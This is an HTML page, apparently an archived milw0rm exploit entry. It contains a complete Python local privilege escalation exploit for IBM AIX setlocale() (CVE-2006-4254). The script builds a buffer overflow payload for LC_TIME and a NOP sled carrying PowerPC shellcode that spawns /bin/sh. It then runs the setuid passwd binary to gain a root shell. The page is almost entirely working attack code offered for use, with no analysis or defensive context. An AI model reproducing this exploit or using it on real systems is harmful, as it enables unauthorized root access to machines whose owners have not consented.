<html><head><title>IBM AIX <= 5.3.0 setlocale() Local Privilege Escalation Exploit</title></head><pre>#
#setlocale() exploit for aix 5.2 ( CVE-2006-4254  )
#thomas.pollet@gmail.com
#
from os import execve

bof=&quot;a&quot;*580+&quot;bbbbccccdddd\x2f\xf2\x28\x2f&quot;
egg=&quot;\x60&quot;*2350
shellcode=(            # by intropy &lt;at&gt; caughq.org
&quot;\x7c\xa5\x2a\x79&quot;     # xor.    r5,r5,r5
&quot;\x40\x82\xff\xfd&quot;     # bnel    &lt;shellcode&gt;
&quot;\x7f\xe8\x02\xa6&quot;     # mflr    r31
&quot;\x3b\xff\x01\x20&quot;     # cal     r31,0x120(r31)
&quot;\x38\x7f\xff\x08&quot;     # cal     r3,-248(r31)
&quot;\x38\x9f\xff\x10&quot;     # cal     r4,-240(r31)
&quot;\x90\x7f\xff\x10&quot;     # st      r3,-240(r31)
&quot;\x90\xbf\xff\x14&quot;     # st      r5,-236(r31)
&quot;\x88\x5f\xff\x0f&quot;     # lbz     r2,-241(r31)
&quot;\x98\xbf\xff\x0f&quot;     # stb     r5,-241(r31)
&quot;\x4c\xc6\x33\x42&quot;     # crorc   cr6,cr6,cr6
&quot;\x44\xff\xff\x02&quot;     # svca
&quot;/bin/sh&quot;
&quot;\x05&quot;)

execve(&quot;/usr/bin/passwd&quot;,[&quot;&quot;],{&quot;EGG&quot;:egg+shellcode,&quot;LC_TIME&quot;:bof})

# milw0rm.com [2007-11-07]</pre></html>